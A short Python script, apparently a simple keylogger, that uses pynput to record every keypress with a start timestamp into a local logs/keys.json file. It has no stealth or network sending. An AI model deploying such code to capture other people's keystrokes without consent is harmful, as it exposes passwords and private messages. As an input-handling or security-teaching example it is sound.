
from pynput import keyboard

import json
import os
from datetime import datetime

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keys.json")
os.makedirs(LOG_DIR, exist_ok=True)

stats = {
    "key": None,
    "started_at": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
}

def save_stats():
    with open(LOG_FILE, "a", encoding="utf-8") as json_file:
        json.dump(stats, json_file, indent=4, ensure_ascii=False)

def on_press(key):
    stats["key"] = str(key)
    save_stats()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()